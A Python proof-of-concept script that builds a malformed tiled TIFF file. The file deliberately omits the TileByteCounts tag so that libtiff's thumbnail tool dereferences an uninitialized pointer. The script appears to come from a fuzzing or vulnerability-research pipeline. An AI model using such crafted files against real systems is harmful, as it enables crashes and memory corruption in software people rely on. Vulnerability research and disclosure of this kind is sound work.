#!/usr/bin/env python3
"""
PoC generator for VULN 004: Use of Uninitialized Pointer bytecounts in cpTiles
in libtiff thumbnail.c

Root cause: tsize_t *bytecounts declared uninitialized. TIFFGetField for
TILEBYTECOUNTS tag return value not checked. When tag is missing, bytecounts
retains garbage stack value, and bytecounts[t] dereferences it.

Trigger: Tiled TIFF (has TileWidth + TileLength tags) WITHOUT TILEBYTECOUNTS tag.
"""
import struct
import os

out_path = "/data/ylwang/non-textfuzz/target/_poc/libtiff/tools_thumbnail_c/vuln_004.tif"

# TIFF is little-endian
# Header: byte order mark, magic number, offset to first IFD
BYTE_ORDER = b'II'   # little-endian
MAGIC = 42

# We'll place pixel data at offset 512 to leave room for IFD
DATA_OFFSET = 512
IMAGE_WIDTH = 256
IMAGE_LENGTH = 256
TILE_WIDTH = 256
TILE_LENGTH = 256

# Single tile of IMAGE_WIDTH x IMAGE_LENGTH pixels, 1 byte each
TILE_SIZE = TILE_WIDTH * TILE_LENGTH
tile_data = bytes(TILE_SIZE)

# IFD starts at offset 8 (right after header)
IFD_OFFSET = 8

# Tags sorted in ascending order (REQUIRED by TIFF spec)
# Format: (tag, type, count, value_or_offset)
# TIFF types: 1=BYTE, 3=SHORT, 4=LONG
SHORT = 3
LONG = 4

# Tags to include (sorted by tag number):
# 0x0100 ImageWidth = 256
# 0x0101 ImageLength = 256
# 0x0102 BitsPerSample = 8
# 0x0103 Compression = 1 (no compression)
# 0x0106 PhotometricInterpretation = 1 (BlackIsZero)
# 0x0115 SamplesPerPixel = 1
# 0x0142 TileWidth = 256
# 0x0143 TileLength = 256
# 0x0144 TileOffsets -> DATA_OFFSET (1 tile)
# NOTE: 0x0145 TileByteCounts is deliberately OMITTED!

tags = [
    (0x0100, LONG,  1, IMAGE_WIDTH),      # ImageWidth
    (0x0101, LONG,  1, IMAGE_LENGTH),     # ImageLength
    (0x0102, SHORT, 1, 8),                # BitsPerSample = 8
    (0x0103, SHORT, 1, 1),                # Compression = 1 (None)
    (0x0106, SHORT, 1, 1),                # PhotometricInterpretation = 1
    (0x0115, SHORT, 1, 1),                # SamplesPerPixel = 1
    (0x0142, LONG,  1, TILE_WIDTH),       # TileWidth = 256
    (0x0143, LONG,  1, TILE_LENGTH),      # TileLength = 256
    # TileOffsets (tag 0x0144): 1 tile, pointing to DATA_OFFSET
    (0x0144, LONG,  1, DATA_OFFSET),      # TileOffsets (inline, count=1)
    # TileByteCounts (0x0145) is OMITTED to trigger the bug
]

num_tags = len(tags)

# Build the IFD
# Each entry: 2 (tag) + 2 (type) + 4 (count) + 4 (value/offset) = 12 bytes
ifd_data = struct.pack('<H', num_tags)  # number of directory entries

for (tag, typ, count, value) in tags:
    ifd_data += struct.pack('<HHII', tag, typ, count, value)

# Next IFD offset = 0 (no more IFDs)
ifd_data += struct.pack('<I', 0)

# Build the full TIFF file
header = struct.pack('<2sHI', BYTE_ORDER, MAGIC, IFD_OFFSET)

# Pad to DATA_OFFSET
total_before_data = len(header) + len(ifd_data)
if total_before_data > DATA_OFFSET:
    # Adjust DATA_OFFSET or pad differently
    # Just put data right after IFD with alignment
    DATA_OFFSET = ((total_before_data + 3) // 4) * 4
    # Rebuild tag for TileOffsets with updated DATA_OFFSET
    tags_new = []
    for (tag, typ, count, value) in tags:
        if tag == 0x0144:
            tags_new.append((tag, typ, count, DATA_OFFSET))
        else:
            tags_new.append((tag, typ, count, value))
    tags = tags_new
    # Rebuild IFD
    ifd_data = struct.pack('<H', num_tags)
    for (tag, typ, count, value) in tags:
        ifd_data += struct.pack('<HHII', tag, typ, count, value)
    ifd_data += struct.pack('<I', 0)

padding = b'\x00' * (DATA_OFFSET - len(header) - len(ifd_data))

tiff_bytes = header + ifd_data + padding + tile_data

os.makedirs(os.path.dirname(out_path), exist_ok=True)
with open(out_path, 'wb') as f:
    f.write(tiff_bytes)

print(f"Written {len(tiff_bytes)} bytes to {out_path}")
print(f"IFD at offset {IFD_OFFSET}, {num_tags} tags")
print(f"Tile data at offset {DATA_OFFSET}, {TILE_SIZE} bytes")
print("TileByteCounts tag (0x0145) is OMITTED to trigger vuln 004")
